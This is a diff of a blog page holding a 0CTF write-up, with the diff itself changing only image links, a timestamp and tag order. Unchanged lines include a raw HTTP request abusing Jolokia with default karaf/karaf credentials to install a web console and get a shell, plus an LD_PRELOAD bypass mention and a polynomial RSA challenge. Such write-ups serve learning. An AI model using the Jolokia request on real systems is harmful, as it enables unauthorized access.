@@ -16,14 +16,14 @@
 <meta property="og:site_name" content="gml&#39;s blog">
 <meta property="og:description" content="果然 0CTF 是为神仙准备的，自闭了。 WebGhost Pepper">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-a8de5797085db37e.png?imageMogr2&#x2F;auto-orient&#x2F;strip%7CimageView2&#x2F;2&#x2F;w&#x2F;1240">
-<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-805d6c483fdf6cf2.png?imageMogr2&#x2F;auto-orient&#x2F;strip%7CimageView2&#x2F;2&#x2F;w&#x2F;1240">
-<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-809ce9413e637f1e.png?imageMogr2&#x2F;auto-orient&#x2F;strip%7CimageView2&#x2F;2&#x2F;w&#x2F;1240">
-<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-a36bb49753da5b38.png?imageMogr2&#x2F;auto-orient&#x2F;strip%7CimageView2&#x2F;2&#x2F;w&#x2F;1240">
-<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-cceb2d14f84f2b6a.png?imageMogr2&#x2F;auto-orient&#x2F;strip%7CimageView2&#x2F;2&#x2F;w&#x2F;1240">
-<meta property="og:updated_time" content="2019-10-28T17:08:17.656Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-a8de5797085db37e.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-805d6c483fdf6cf2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-809ce9413e637f1e.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-a36bb49753da5b38.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-cceb2d14f84f2b6a.png">
+<meta property="og:updated_time" content="2019-10-29T11:44:31.193Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-a8de5797085db37e.png?imageMogr2&#x2F;auto-orient&#x2F;strip%7CimageView2&#x2F;2&#x2F;w&#x2F;1240">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;upload-images.jianshu.io&#x2F;upload_images&#x2F;9223743-a8de5797085db37e.png">
   
     <link rel="alternative" href="/atom.xml" title="gml&#39;s blog" type="application/atom+xml">
   
@@ -194,13 +194,13 @@
 <li><a href="https://blog.csdn.net/like98k/article/details/88797218" target="_blank" rel="noopener">https://blog.csdn.net/like98k/article/details/88797218</a></li>
 </ol>
 <p>进去发现要登录，用 chrome 看不出，拿 firefox可以看到提示：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/9223743-a8de5797085db37e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9223743-a8de5797085db37e.png" alt="image.png"></p>
 <p>karaf/karaf 登录进去，发现什么也没有，看到是 Jetty，发现有 Jolokia，搜漏洞。 </p>
 <p>比较简单的一种做法是 karaf 有一个 webconsole，我们可以安装一个进控制台拿 flag。</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jolokia/exec</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 111.186.63.207:31337</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Authorization</span>: Basic a2FyYWY6a2FyYWY=</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain</span><br><span class="line"><span class="attribute">Content-Length</span>: 150</span><br><span class="line"></span><br><span class="line">&#123;  "mbean": "org.apache.karaf:name=root,type=feature",  "operation": "installFeature(java.lang.String)",  "type": "EXEC",  "arguments":["webconsole"]&#125;</span><br></pre></td></tr></table></figure>
 
 <p>访问 <code>http://111.186.63.207:31337/system/console/gogo</code></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/9223743-805d6c483fdf6cf2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9223743-805d6c483fdf6cf2.png" alt="image.png"></p>
 <p>另一种是通过osgi.core 的 installBundleFromURL 来安装bundle，这部分可以参考@moxiaoxi的wp。</p>
 <h4 id="Wallbreaker-Easy"><a href="#Wallbreaker-Easy" class="headerlink" title="Wallbreaker Easy"></a>Wallbreaker Easy</h4><p>赛后看各位大师傅们的 wp，基本都是通过启用新的进程来调用 so，so文件我们可控并通过修改<code>LD_PRELOAD</code>  方式加载来执行命令。这里贴上几个链接。</p>
 <ol>
@@ -217,7 +217,7 @@
 
 <h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p>0CTF的 Crypto 抬手就是论文，真实。</p>
 <h4 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h4><p>pubkey.py 中发现 RSA 的公钥 e=31337，而 N 是个多项式。</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/9223743-809ce9413e637f1e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9223743-809ce9413e637f1e.png" alt="image.png"></p>
 <p>rsa.sage:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pubkey <span class="keyword">import</span> P, n, e</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"></span><br><span class="line">R.&lt;a&gt; = GF(<span class="number">2</span>^<span class="number">2049</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    <span class="keyword">assert</span> len(m) &lt;= <span class="number">256</span></span><br><span class="line">    m_int = Integer(m.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">    m_poly = P(R.fetch_int(m_int))</span><br><span class="line">    c_poly = pow(m_poly, e, n)</span><br><span class="line">    c_int = R(c_poly).integer_representation()</span><br><span class="line">    c = format(c_int, <span class="string">'0256x'</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ptext = flag + os.urandom(<span class="number">256</span>-len(flag))</span><br><span class="line">    ctext = encrypt(ptext)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'flag.enc'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(ctext)</span><br></pre></td></tr></table></figure>
 
@@ -227,9 +227,9 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Factor[多项式,Modulus-&gt;2]</span><br></pre></td></tr></table></figure>
 
 <p>可以看到 Mathematica 给出了结果：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/9223743-a36bb49753da5b38.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9223743-a36bb49753da5b38.png" alt="image.png"></p>
 <p>两个因式的最高次数是 821 和 1227，那么可以计算 s（参照上面提到的论文）：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/9223743-cceb2d14f84f2b6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9223743-cceb2d14f84f2b6a.png" alt="image.png"></p>
 <blockquote>
 <p>s = (2^821-1) * (2^1227-1)</p>
 </blockquote>
@@ -596,11 +596,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">wp</a>
+                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+                <a href="javascript:void(0)" class="js-tag color3">wp</a>
               </li>
              
               <li class="article-tag-list-item">
